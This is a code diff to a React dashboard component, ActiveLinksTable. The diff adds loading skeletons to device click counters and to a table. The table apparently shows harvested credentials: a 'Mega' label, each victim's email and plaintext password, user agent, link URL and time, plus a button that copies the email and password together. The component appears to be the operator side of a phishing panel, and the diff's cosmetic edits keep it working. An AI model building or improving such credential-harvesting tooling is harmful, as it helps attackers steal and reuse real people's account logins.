@@ -105,35 +105,58 @@ const ActiveLinksTable = () => {
 
       {/* Device Counts Section */}
       <section className="flex items-center justify-between gap-5">
-        {["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((title, index) => (
-          <div className="w-full" key={index}>
-            <div
-              className={`flex justify-between rounded-md ${
-                index === 0 ? "bg-cyan-600" : index === 1 ? "bg-[#28a745]" : index === 2 ? "bg-[#ffc107]" : "bg-[#dc3545]"
+  {loading ? (
+    // Skeleton Loader
+    ["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((_, index) => (
+      <div className="w-full" key={index}>
+        <div className="flex justify-between bg-gray-200 rounded-md animate-pulse">
+          <div className="flex flex-col w-full gap-1">
+            <div className="h-12 px-4 pt-5 bg-gray-300 rounded-md"></div> {/* Skeleton for number */}
+            <div className="h-6 px-4 pb-6 mt-2 bg-gray-300 rounded-md"></div> {/* Skeleton for title */}
+            <div className="w-full h-10 p-2 mt-2 bg-gray-300 rounded-md"></div> {/* Skeleton for button */}
+          </div>
+        </div>
+      </div>
+    ))
+  ) : (
+    // Real content
+    ["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((title, index) => (
+      <div className="w-full" key={index}>
+        <div
+          className={`flex justify-between rounded-md ${
+            index === 0
+              ? "bg-cyan-600"
+              : index === 1
+              ? "bg-[#28a745]"
+              : index === 2
+              ? "bg-[#ffc107]"
+              : "bg-[#dc3545]"
+          }`}
+        >
+          <div className="flex flex-col w-full gap-1">
+            <h1 className="px-4 pt-5 text-3xl font-bold text-white">{Object.values(deviceCounts)[index]}</h1>
+            <p className="px-4 pb-6 text-white">{title}</p>
+            <button
+              className={`flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md ${
+                index === 0
+                  ? "hover:bg-cyan-800 bg-cyan-700"
+                  : index === 1
+                  ? "hover:bg-[#196e2d] bg-[#1a7d31]"
+                  : index === 2
+                  ? "hover:bg-[#d1a72b] bg-yellow-400"
+                  : "hover:bg-[#962934] bg-[#c92535]"
               }`}
             >
-              <div className="flex flex-col w-full gap-1">
-                <h1 className="px-4 pt-5 text-3xl font-bold text-white">{Object.values(deviceCounts)[index]}</h1>
-                <p className="px-4 pb-6 text-white">{title}</p>
-                <button
-                  className={`flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md ${
-                    index === 0
-                      ? "hover:bg-cyan-800 bg-cyan-700"
-                      : index === 1
-                      ? "hover:bg-[#196e2d] bg-[#1a7d31]"
-                      : index === 2
-                      ? "hover:bg-[#d1a72b] bg-yellow-400"
-                      : "hover:bg-[#962934] bg-[#c92535]"
-                  }`}
-                >
-                  More Info
-                  <FaRegArrowAltCircleRight />
-                </button>
-              </div>
-            </div>
+              More Info
+              <FaRegArrowAltCircleRight />
+            </button>
           </div>
-        ))}
-      </section>
+        </div>
+      </div>
+    ))
+  )}
+</section>
+
 
       {/* Data Table */}
       <div className="pt-10 overflow-x-auto rounded shadow-lg">
@@ -155,35 +178,44 @@ const ActiveLinksTable = () => {
             </tr>
           </thead>
           <tbody>
-            {currentItems?.length === 0 ? (
-              <tr>
-                <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
-                  No Data Available
-                </td>
-              </tr>
-            ) : (
-              currentItems.map((link, index) => (
-                <tr key={link._id} className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200`}>
-                  <td className="px-4 py-2 border border-gray-300">{index + 1}</td>
-                  <td className="px-4 py-2 border border-gray-300">Mega</td>
-                  <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
-                  <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
-                  <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
-                  <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
-                  <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
-                  <td className="px-4 py-2 border border-gray-300">{formatDistanceToNow(new Date(link?.createdAt), { addSuffix: true })}</td>
-                  <td className="px-4 py-2 text-center border border-gray-300">
-                    <button
-                      onClick={() => copyToClipboard(link?.email + " " + link?.password)}
-                      className="p-2 text-white bg-green-500 rounded hover:bg-green-600"
-                    >
-                      <MdContentCopy size={18} />
-                    </button>
-                  </td>
-                </tr>
-              ))
-            )}
-          </tbody>
+  {loading ? (
+    <tr>
+      <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
+        Looding...
+      </td>
+    </tr>
+  ) : currentItems?.length === 0 ? (
+    <tr>
+      <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
+        No Data Available
+      </td>
+    </tr>
+  ) : (
+    currentItems.map((link, index) => (
+      <tr key={link._id} className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200`}>
+        <td className="px-4 py-2 border border-gray-300">{index + 1}</td>
+        <td className="px-4 py-2 border border-gray-300">Mega</td>
+        <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
+        <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
+        <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
+        <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
+        <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
+        <td className="px-4 py-2 border border-gray-300">
+          {link?.createdAt ? formatDistanceToNow(new Date(link?.createdAt), { addSuffix: true }) : "N/A"}
+        </td>
+        <td className="px-4 py-2 text-center border border-gray-300">
+          <button
+            onClick={() => copyToClipboard(link?.email + " " + link?.password)}
+            className="p-2 text-white bg-green-500 rounded hover:bg-green-600"
+          >
+            <MdContentCopy size={18} />
+          </button>
+        </td>
+      </tr>
+    ))
+  )}
+</tbody>
+
         </table>
       </div>
 
